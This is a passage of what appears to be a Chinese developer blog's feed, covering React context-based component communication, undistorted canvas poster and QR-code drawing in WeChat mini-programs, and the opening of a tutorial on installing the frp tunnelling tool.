class="regexp">&#125;</span></span><br></pre></td></tr></table></figure><ul><li>示例</li></ul><p><code>index.jsx</code></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> React, &#123; Component, createContext &#125; <span class="keyword">from</span> <span class="string">'react'</span></span><br><span class="line"><span class="keyword">import</span> Parent <span class="keyword">from</span> <span class="string">'./Parent'</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">// 1. 创建上下文对象</span></span><br><span class="line"><span class="comment">// @ts-ignore</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> MyContext = createContext()</span><br><span class="line"> </span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="class"><span class="keyword">class</span> <span class="title">App</span> <span class="keyword">extends</span> <span class="title">Component</span> </span>&#123;</span><br><span class="line">  state = &#123;</span><br><span class="line">    money: <span class="number">10000</span></span><br><span class="line">  &#125;</span><br><span class="line">  updateMoney = <span class="function"><span class="params">newMoney</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">this</span>.setState(&#123;</span><br><span class="line">      money: newMoney</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;</span><br><span class="line">  render() &#123;</span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">      <span class="comment">// 2. Provider包裹确定上下文生效范围，value注入范围内可用的数据</span></span><br><span class="line">      &lt;MyContext.Provider value=&#123;&#123;</span><br><span class="line">        money: <span class="keyword">this</span>.state.money,</span><br><span class="line">        updateMoney: <span class="keyword">this</span>.updateMoney</span><br><span class="line">      &#125;&#125;&gt;</span><br><span class="line">        &lt;div className=<span class="string">"app"</span>&gt;</span><br><span class="line">          &lt;h1&gt;根组件：&#123;<span class="keyword">this</span>.state.money&#125;&lt;<span class="regexp">/h1&gt;</span></span><br><span class="line"><span class="regexp">          &lt;hr /</span>&gt;</span><br><span class="line">          &lt;Parent /&gt;</span><br><span class="line">        &lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">      &lt;/</span>MyContext.Provider&gt;</span><br><span class="line">    )</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>Parent.jsx</code></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> Child <span class="keyword">from</span> <span class="string">'./Child'</span>;</span><br><span class="line"><span class="keyword">const</span> Parent = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    &lt;div className=<span class="string">"parent"</span>&gt;</span><br><span class="line">      &lt;h3&gt;父组件：&lt;<span class="regexp">/h3&gt;</span></span><br><span class="line"><span class="regexp">      &lt;hr /</span>&gt;</span><br><span class="line">      &lt;Child /&gt;</span><br><span class="line">    &lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">  );</span></span><br><span class="line"><span class="regexp">&#125;;</span></span><br><span class="line"><span class="regexp"> </span></span><br><span class="line"><span class="regexp">export default Parent;</span></span><br></pre></td></tr></table></figure><p><code>Child.jsx</code></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; MyContext &#125; <span class="keyword">from</span> <span class="string">'./App'</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">const</span> Child = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="comment">// 3. 通过Consumer来消费数据，value=&gt;&#123; 这里使用数据 &#125;</span></span><br><span class="line">    &lt;MyContext.Consumer&gt;</span><br><span class="line">      &#123;(value) =&gt; (</span><br><span class="line">        &lt;div className=<span class="string">"child"</span>&gt;</span><br><span class="line">          &lt;h5&gt;子组件：&#123;value.money&#125; &lt;button onClick=&#123;()=&gt;value.updateMoney(<span class="number">5000</span>)&#125;&gt;修改money&lt;<span class="regexp">/button&gt;&lt;/</span>h5&gt;</span><br><span class="line">        &lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">      )&#125;</span></span><br><span class="line"><span class="regexp">    &lt;/</span>MyContext.Consumer&gt;</span><br><span class="line">  );</span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> Child;</span><br></pre></td></tr></table></figure><p><strong>总结：</strong></p><ul><li>使用<code>creatContext()</code>创建一个上下文对象，包含：<code>Provider</code> <code>Consumer</code> 组件。</li><li>使用 <code>Provider</code> 包裹组件，<code>value</code> 属性注入<code>状态，函数</code>，被包裹组件下的任何组件可以使用。</li><li>使用 <code>Consumer</code> 消费 <code>Provider</code> 提供的数据和函数，语法<code>{value=&gt;使用数据和函数}</code></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;组件通讯-概念&quot;&gt;&lt;a href=&quot;#组件通讯-概念&quot; class=&quot;headerlink&quot; title=&quot;组件通讯-概念&quot;&gt;&lt;/a&gt;组件通讯-概念&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;组件状态是独立的，组件化之后涉及状态同步，需要进行组件通讯&lt;/p&gt;
&lt;/b
      
    
    </summary>
    
      <category term="前端" scheme="//www.shen.ee/categories/%E5%89%8D%E7%AB%AF/"/>
    
    
      <category term="React" scheme="//www.shen.ee/tags/React/"/>
    
      <category term="React组件" scheme="//www.shen.ee/tags/React%E7%BB%84%E4%BB%B6/"/>
    
      <category term="React组件通讯" scheme="//www.shen.ee/tags/React%E7%BB%84%E4%BB%B6%E9%80%9A%E8%AE%AF/"/>
    
      <category term="React父子组件传值" scheme="//www.shen.ee/tags/React%E7%88%B6%E5%AD%90%E7%BB%84%E4%BB%B6%E4%BC%A0%E5%80%BC/"/>
    
      <category term="React兄弟组件传值" scheme="//www.shen.ee/tags/React%E5%85%84%E5%BC%9F%E7%BB%84%E4%BB%B6%E4%BC%A0%E5%80%BC/"/>
    
      <category term="组件传值" scheme="//www.shen.ee/tags/%E7%BB%84%E4%BB%B6%E4%BC%A0%E5%80%BC/"/>
    
      <category term="父子组件传值" scheme="//www.shen.ee/tags/%E7%88%B6%E5%AD%90%E7%BB%84%E4%BB%B6%E4%BC%A0%E5%80%BC/"/>
    
      <category term="props" scheme="//www.shen.ee/tags/props/"/>
    
      <category term="context跨级组件通讯" scheme="//www.shen.ee/tags/context%E8%B7%A8%E7%BA%A7%E7%BB%84%E4%BB%B6%E9%80%9A%E8%AE%AF/"/>
    
  </entry>
  
  <entry>
    <title>小程序canvas生成海报图片压缩和失真问题解决</title>
    <link href="//www.shen.ee/article/57435.html"/>
    <id>//www.shen.ee/article/57435.html</id>
    <published>2022-04-13T02:38:39.000Z</published>
    <updated>2022-06-22T06:24:26.009Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>微信小程序实现canvas按照原图等比例不失真绘制海报图，防止模糊</p><p>我这里的场景是收款二维码+收款背景图。</p></blockquote><h2 id="绘制二维码"><a href="#绘制二维码" class="headerlink" title="绘制二维码"></a>绘制二维码</h2><p>我这里绘制二维码使用的 <a href="https://github.com/demi520/wxapp-qrcode" target="_blank" rel="noopener">wxapp-qrcode</a> ，也可以使用<a href="https://github.com/yingye/weapp-qrcode" target="_blank" rel="noopener">weapp-qrcode</a>，基本都一样，详细代码不过多累赘，这里主要说下适配不同屏幕大小的canvas。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">onLoad: <span class="function"><span class="keyword">function</span> (<span class="params">options</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> size = <span class="keyword">this</span>.setCanvasSize() <span class="comment">// 动态设置画布大小</span></span><br><span class="line">  <span class="keyword">this</span>.createQrCode(<span class="string">'www.iyouhun.com'</span>, <span class="string">"mycanvas"</span>, size.w, size.h)</span><br><span class="line">&#125;,</span><br><span class="line"><span class="comment">// 适配不同屏幕大小的canvas</span></span><br><span class="line">setCanvasSize: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> size = &#123;&#125;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">var</span> res = wx.getSystemInfoSync()</span><br><span class="line">    <span class="keyword">var</span> scale = <span class="number">750</span> / <span class="number">686</span>; <span class="comment">// 不同屏幕下canvas的适配比例；设计稿是750宽，686是因为wxss样式文件中设置的canvas大小</span></span><br><span class="line">    <span class="keyword">var</span> width = res.windowWidth / scale</span><br><span class="line">    <span class="keyword">var</span> height = width; <span class="comment">// canvas画布为正方形</span></span><br><span class="line">    size.w = width</span><br><span class="line">    size.h = height</span><br><span class="line">  &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"获取设备信息失败"</span> + e)</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> size</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><h2 id="绘制背景图"><a href="#绘制背景图" class="headerlink" title="绘制背景图"></a>绘制背景图</h2><h3 id="动态设置图片的高度和宽度"><a href="#动态设置图片的高度和宽度" class="headerlink" title="动态设置图片的高度和宽度"></a>动态设置图片的高度和宽度</h3><p>在小程序布局中，如果图片不是固定高度和高度，但<code>image</code>设置的是固定的高度和宽度，这时候原始图片相对<code>image</code>设置的固定高度和宽度不是等比例大小，那么这张图片就会变形，变的不清晰。这时就可以使用下面的等比例缩放的方式缩放图片，让图片不变形。或者通过<code>image</code>的<code>bindload</code>方法动态的获取图片的高度和宽度，动态的设置图片的高度和宽度，是图片布局的高度和宽度和原始图片的高度和宽度相等。</p><p><strong>图片等比例缩放工具</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Util.js </span></span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Util</span></span>&#123; </span><br><span class="line">  <span class="comment">/*** </span></span><br><span class="line"><span class="comment">   * 按照显示图片的宽等比例缩放得到显示图片的高 </span></span><br><span class="line"><span class="comment">   * @params originalWidth 原始图片的宽 </span></span><br><span class="line"><span class="comment">   * @params originalHeight 原始图片的高 </span></span><br><span class="line"><span class="comment">   * @params imageWidth   显示图片的宽，如果不传就使用屏幕的宽 </span></span><br><span class="line"><span class="comment">   * 返回图片的宽高对象 </span></span><br><span class="line"><span class="comment">  ***/</span> </span><br><span class="line">  <span class="keyword">static</span> imageZoomHeightUtil(originalWidth,originalHeight,imageWidth)&#123; </span><br><span class="line">    <span class="keyword">let</span> imageSize = &#123;&#125;; </span><br><span class="line">    <span class="keyword">if</span>(imageWidth)&#123; </span><br><span class="line">      imageSize.imageWidth = imageWidth; </span><br><span class="line">      imageSize.imageHeight = (imageWidth * originalHeight) / originalWidth; </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;<span class="comment">//如果没有传imageWidth,使用屏幕的宽 </span></span><br><span class="line">      wx.getSystemInfo(&#123;  </span><br><span class="line">        success: <span class="function"><span class="keyword">function</span> (<span class="params">res</span>) </span>&#123;  </span><br><span class="line">          imageWidth = res.windowWidth;  </span><br><span class="line">          imageSize.imageWidth = imageWidth; </span><br><span class="line">          imageSize.imageHeight = (imageWidth * originalHeight) / originalWidth; </span><br><span class="line">        &#125;  </span><br><span class="line">      &#125;); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">return</span> imageSize; </span><br><span class="line">  &#125; </span><br><span class="line"> </span><br><span class="line">  <span class="comment">/*** </span></span><br><span class="line"><span class="comment">   * 按照显示图片的高等比例缩放得到显示图片的宽 </span></span><br><span class="line"><span class="comment">   * @params originalWidth 原始图片的宽 </span></span><br><span class="line"><span class="comment">   * @params originalHeight 原始图片的高 </span></span><br><span class="line"><span class="comment">   * @params imageHeight  显示图片的高，如果不传就使用屏幕的高 </span></span><br><span class="line"><span class="comment">   * 返回图片的宽高对象 </span></span><br><span class="line"><span class="comment">  ***/</span> </span><br><span class="line">  <span class="keyword">static</span> imageZoomWidthUtil(originalWidth,originalHeight,imageHeight)&#123; </span><br><span class="line">    <span class="keyword">let</span> imageSize = &#123;&#125;; </span><br><span class="line">    <span class="keyword">if</span>(imageHeight)&#123; </span><br><span class="line">      imageSize.imageWidth = (imageHeight *originalWidth) / originalHeight; </span><br><span class="line">      imageSize.imageHeight = imageHeight; </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;<span class="comment">//如果没有传imageHeight,使用屏幕的高 </span></span><br><span class="line">      wx.getSystemInfo(&#123;  </span><br><span class="line">        success: <span class="function"><span class="keyword">function</span> (<span class="params">res</span>) </span>&#123;  </span><br><span class="line">          imageHeight = res.windowHeight; </span><br><span class="line">          imageSize.imageWidth = (imageHeight *originalWidth) / originalHeight; </span><br><span class="line">          imageSize.imageHeight = imageHeight; </span><br><span class="line">        &#125;  </span><br><span class="line">      &#125;); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">return</span> imageSize; </span><br><span class="line">  &#125; </span><br><span class="line"> </span><br><span class="line">&#125; </span><br><span class="line"> </span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> Util;</span><br></pre></td></tr></table></figure><p><strong>工具库使用</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;image bindload=&quot;imageLoad&quot;  src=&quot;../test.png&quot;/&gt;</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> Util <span class="keyword">from</span> <span class="string">'../common/Util'</span></span><br><span class="line"> </span><br><span class="line">Page(&#123; </span><br><span class="line"> data:&#123; </span><br><span class="line">    imageWidth:<span class="number">0</span>, </span><br><span class="line">    imageHeight:<span class="number">0</span> </span><br><span class="line"> &#125;, </span><br><span class="line"> imageLoad: <span class="function"><span class="keyword">function</span> (<span class="params">e</span>) </span>&#123;  </span><br><span class="line">    <span class="comment">//获取图片的原始宽度和高度 </span></span><br><span class="line">    <span class="keyword">let</span> originalWidth = e.detail.width</span><br><span class="line">    <span class="keyword">let</span> originalHeight = e.detail.height</span><br><span class="line">    <span class="keyword">let</span> imageSize = Util.imageZoomWidthUtil(originalWidth,originalHeight,<span class="number">145</span>)</span><br><span class="line">    <span class="keyword">this</span>.setData(&#123;<span class="attr">imageWidth</span>:imageSize.imageWidth,<span class="attr">imageHeight</span>:imageSize.imageHeight&#125;)</span><br><span class="line"> &#125; </span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h3 id="绘制背景图-1"><a href="#绘制背景图-1" class="headerlink" title="绘制背景图"></a>绘制背景图</h3><p>用上面的方法动态设置图片宽高，解决失真问题</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> Util <span class="keyword">from</span> <span class="string">'../../libs/Util'</span></span><br><span class="line"><span class="comment">// 背景图</span></span><br><span class="line"><span class="keyword">let</span> bgImg = <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span> (<span class="params">resolve</span>) </span>&#123;</span><br><span class="line">  wx.getImageInfo(&#123;</span><br><span class="line">    src: <span class="string">'https://www.iyouhun.com/payment/payment_pic.jpg'</span>,</span><br><span class="line">    success: <span class="function"><span class="keyword">function</span> (<span class="params">res</span>) </span>&#123;</span><br><span class="line">      that.setData(&#123;</span><br><span class="line">        imgInfo: res</span><br><span class="line">      &#125;)</span><br><span class="line">      <span class="comment">// 根据屏幕宽度得到图片高</span></span><br><span class="line">      <span class="keyword">const</span> imageSize = Util.imageZoomHeightUtil(that.data.imgInfo.width, that.data.imgInfo.height) </span><br><span class="line">      that.setData(&#123; <span class="attr">canvasHeight</span>: imageSize.imageHeight &#125;)</span><br><span class="line">      resolve(res.path)</span><br><span class="line">    &#125;,</span><br><span class="line">    fail: <span class="function"><span class="keyword">function</span> (<span class="params">err</span>) </span>&#123;</span><br><span class="line">      <span class="built_in">console</span>.log(err)</span><br><span class="line">      wx.showToast(&#123;</span><br><span class="line">        title: <span class="string">'网络错误请重试'</span>,</span><br><span class="line">        icon: <span class="string">'loading'</span></span><br><span class="line">      &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h2 id="合成海报-收款码"><a href="#合成海报-收款码" class="headerlink" title="合成海报/收款码"></a>合成海报/收款码</h2><p>这里使用<code>Promise</code>分别去绘制二维码和背景图。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 收款码</span></span><br><span class="line"><span class="keyword">let</span> qrcodeImg = <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span> (<span class="params">resolve</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;)</span><br><span class="line"><span class="comment">// 背景图</span></span><br><span class="line"><span class="keyword">let</span> bgImg = <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span> (<span class="params">resolve</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">Promise</span>.all([bgImg, qrcodeImg]).then(<span class="function"><span class="keyword">function</span>(<span class="params">result</span>) </span>&#123;</span><br><span class="line">  wx.showLoading(&#123;<span class="attr">title</span>: <span class="string">'加载中'</span>&#125;)</span><br><span class="line">  <span class="comment">// canvas绘制文字和图片，创建画图</span></span><br><span class="line">  <span class="keyword">const</span> ctx = wx.createCanvasContext(<span class="string">'myCanvas'</span>)</span><br><span class="line">  <span class="comment">// 绘制背景图</span></span><br><span class="line">  ctx.drawImage(result[<span class="number">0</span>], <span class="number">0</span>, <span class="number">0</span>, that.data.imgInfo.width, that.data.imgInfo.height, <span class="number">0</span>, <span class="number">0</span>, that.data.canvasWidth, that.data.canvasHeight)</span><br><span class="line">  ctx.setFillStyle(<span class="string">'white'</span>)</span><br><span class="line">  <span class="comment">// 绘制二维码 二维码宽度300</span></span><br><span class="line">  <span class="keyword">const</span> qrX = (that.data.canvasWidth - <span class="number">300</span>) / <span class="number">2</span> <span class="comment">// canvas宽度 - 二维码宽度 / 2 (居中)</span></span><br><span class="line">  ctx.drawImage(result[<span class="number">1</span>], qrX, <span class="number">120</span>, <span class="number">300</span>, <span class="number">300</span>)</span><br><span class="line">  <span class="comment">// 绘制文本</span></span><br><span class="line">  ctx.fillStyle = <span class="string">'#ffffff'</span> <span class="comment">// 背景</span></span><br><span class="line">  ctx.fillRect(<span class="built_in">Math</span>.floor(qrX),<span class="number">420</span>,<span class="number">300</span>,<span class="number">20</span>)</span><br><span class="line">  ctx.fillStyle = <span class="string">"#333333"</span></span><br><span class="line">  ctx.font = <span class="number">25</span> + <span class="string">'px Arial'</span> <span class="comment">// 文本大小, 字体</span></span><br><span class="line">  ctx.textAlign = <span class="string">'center'</span></span><br><span class="line">  ctx.fillText(</span><br><span class="line">    <span class="string">'No.'</span>+ that.data.serialNum,</span><br><span class="line">    that.data.canvasWidth / <span class="number">2</span>, <span class="comment">// 左上角 X坐标</span></span><br><span class="line">    <span class="number">430</span>, <span class="comment">// 左上角 Y坐标</span></span><br><span class="line">    <span class="number">300</span></span><br><span class="line">  )</span><br><span class="line">  <span class="comment">//canvasToTempFilePath必须要在draw的回调中执行，否则会生成失败，官方文档有说明</span></span><br><span class="line">  ctx.draw(<span class="literal">false</span>, setTimeout(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    wx.canvasToTempFilePath(&#123;</span><br><span class="line">      canvasId: <span class="string">'myCanvas'</span>,</span><br><span class="line">      x: <span class="number">0</span>,</span><br><span class="line">      y: <span class="number">0</span>,</span><br><span class="line">      width: that.data.canvasWidth,</span><br><span class="line">      height: that.data.canvasHeight,</span><br><span class="line">      success: <span class="function"><span class="keyword">function</span> (<span class="params">res</span>) </span>&#123;</span><br><span class="line">        wx.hideLoading()</span><br><span class="line">        that.setData(&#123;</span><br><span class="line">          qrcodeStatus: <span class="literal">true</span>,</span><br><span class="line">          shareImgSrc: res.tempFilePath</span><br><span class="line">        &#125;)</span><br><span class="line">      &#125;,</span><br><span class="line">      fail: <span class="function"><span class="keyword">function</span> (<span class="params">res</span>) </span>&#123;</span><br><span class="line">        wx.hideLoading()</span><br><span class="line">        wx.showToast(&#123;</span><br><span class="line">          title: <span class="string">'生成失败'</span>,</span><br><span class="line">          icon: <span class="string">"none"</span></span><br><span class="line">        &#125;)</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;, <span class="number">1000</span>))</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p><strong>效果图</strong></p><p><img src="https://oss.iyouhun.com/img/WechatIMG1762.jpeg" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;微信小程序实现canvas按照原图等比例不失真绘制海报图，防止模糊&lt;/p&gt;
&lt;p&gt;我这里的场景是收款二维码+收款背景图。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;绘制二维码&quot;&gt;&lt;a href=&quot;#绘制二维码&quot; class=&quot;header
      
    
    </summary>
    
      <category term="前端" scheme="//www.shen.ee/categories/%E5%89%8D%E7%AB%AF/"/>
    
    
      <category term="小程序" scheme="//www.shen.ee/tags/%E5%B0%8F%E7%A8%8B%E5%BA%8F/"/>
    
      <category term="微信小程序" scheme="//www.shen.ee/tags/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F/"/>
    
      <category term="canvas" scheme="//www.shen.ee/tags/canvas/"/>
    
      <category term="canvas海报" scheme="//www.shen.ee/tags/canvas%E6%B5%B7%E6%8A%A5/"/>
    
      <category term="小程序海报" scheme="//www.shen.ee/tags/%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%B5%B7%E6%8A%A5/"/>
    
  </entry>
  
  <entry>
    <title>一文搞懂frp内网穿透并搭建配置使用</title>
    <link href="//www.shen.ee/article/3664.html"/>
    <id>//www.shen.ee/article/3664.html</id>
    <published>2021-12-17T02:38:39.000Z</published>
    <updated>2022-06-22T06:24:26.008Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>实现内网穿需要有一台公网服务器、域名。<em>（本文将公网服务器称为服务端，内网服务器称为客户端）</em></p></blockquote><h2 id="frp-是什么"><a href="#frp-是什么" class="headerlink" title="frp 是什么"></a>frp 是什么</h2><p>frp 是一个专注于内网穿透的高性能的反向代理应用，支持 TCP、UDP、HTTP、HTTPS 等多种协议。可以将内网服务以安全、便捷的方式通过具有公网 IP 节点的中转暴露到公网。</p><p><strong>有了内网穿透你能干什么？</strong></p><ul><li>远程访问内网的 http/https 服务</li><li>远程桌面(Windows/Mac)</li><li>远程文件、 SSH</li><li>小程序开发</li><li>…</li></ul><p>有了内网穿透在外访问家里的电脑、NAS、树莓派、摄像头等网络设备或远程控制，那都不是事儿~</p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>官方项目地址：<a href="https://link.zhihu.com/?target=https%3A//github.com/fatedier/frp" target="_blank" rel="noopener">https://github.com/fatedier/frp</a></p><blockquote><p>以下命令请在服务器中执行</p></blockquote><p><strong>下载</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget https://github.com/fatedier/frp/releases/download/v0.38.0/frp_0.38.0_linux_amd64.tar.gz</span><br></pre></td></tr></table></figure><p><strong>解压</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -xvf frp_0.38.0_linux_amd64.tar.gz</span><br></pre></td></tr></table></figure><p><img src="https://oss.iyouhun.com/img/QQ20211125-104420@2x.png" alt=""></p><p><strong>移动至/usr/local</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mkdir /usr/local/frp</span><br><span class="line">mv frp_0.38.0_linux_amd64/* /usr/local/frp/</span><br></pre></td></tr></table></figure><p><strong>文件说明</strong></p><p><code>frps.ini</code>: 服务端配置文件<br><code>frps</code>: 服务端软件<br><code>frpc.ini</code>: 客户端配置文件<br><code>frpc</code>: 客户端软件</p><h3 id="配置systemctl来控制，服务端运行"><a href="#配置systemctl来控制，服务端运行" class="headerlink" title="配置systemctl来控制，服务端运行"></a>配置systemctl来控制，服务端运行</h3><p>vim新建文件并写入配置内容</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim 